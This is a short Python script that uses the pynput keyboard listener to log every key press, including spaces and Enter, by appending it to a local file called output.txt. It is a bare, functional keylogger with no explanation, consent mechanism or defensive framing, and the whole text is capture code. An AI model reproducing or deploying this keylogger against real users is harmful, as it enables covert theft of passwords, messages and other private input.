from pynput import keyboard


pq = chr(10)
def on_press(key):
    f = open("output.txt","a")
    
    try:
        f.write(format(key.char))
    
    except AttributeError:
        if key == key.space:
            f.write(" ")
        
        else:
            if key == key.enter:
                f.write(pq)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
listener.start()
